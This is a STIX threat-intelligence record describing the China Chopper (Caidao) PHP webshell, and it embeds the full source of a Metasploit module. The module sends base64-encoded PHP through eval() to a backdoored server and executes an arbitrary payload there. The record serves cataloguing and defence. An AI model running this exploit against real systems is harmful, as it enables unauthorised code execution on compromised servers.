{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--29f0e233-d631-4621-84b0-20732d96c7a5",
    "created": "2024-08-14T17:11:46.447664Z",
    "modified": "2024-08-14T17:11:46.447667Z",
    "name": "China Chopper Caidao PHP Backdoor Code Execution",
    "description": " This module takes advantage of the China Chopper Webshell that is commonly used by Chinese hackers.  'License'           => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/caidao_php_backdoor_exec.rb",
            "external_id": "caidao_php_backdoor_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-ii.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.exploit-db.com/docs/27654.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisa.gov/uscert/ncas/alerts/TA15-313A"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'              => 'China Chopper Caidao PHP Backdoor Code Execution',\n      'Description'       => %q{\n        This module takes advantage of the China Chopper Webshell that is\n        commonly used by Chinese hackers.\n      },\n      'License'           => MSF_LICENSE,\n      'Author'            => ['Nixawk'],\n      'References'        =>\n        [\n          ['URL', 'https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html'],\n          ['URL', 'https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-ii.html'],\n          ['URL', 'https://www.exploit-db.com/docs/27654.pdf'],\n          ['URL', 'https://www.cisa.gov/uscert/ncas/alerts/TA15-313A']\n        ],\n      'Platform'          => ['php'],\n      'Arch'              => ARCH_PHP,\n      'Targets'           =>\n        [\n          ['Automatic', {}]\n        ],\n      'Privileged'        => false,\n      'DisclosureDate'    => '2015-10-27',\n      'DefaultTarget'     => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The path of backdoor', '/caidao.php']),\n        OptString.new('PASSWORD', [true, 'The password of backdoor', 'chopper'])\n      ])\n  end\n\n  def http_send_command(code)\n    code = \"eval(base64_decode(\\\"#{Rex::Text.encode_base64(code)}\\\"));\"\n    send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path),\n      'vars_post' => {\n        \"#{datastore['PASSWORD']}\" => code\n      }\n    })\n  end\n\n  def check\n    flag = Rex::Text.rand_text_alpha(16)\n    res = http_send_command(\"printf(\\\"#{flag}\\\");\")\n    if res && res.body =~ /#{flag}/m\n      Exploit::CheckCode::Vulnerable\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    print_status(\"Sending exploit...\")\n    http_send_command(payload.raw)\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-10-27",
    "x_mitre_platforms": [
        "['php']"
    ]
}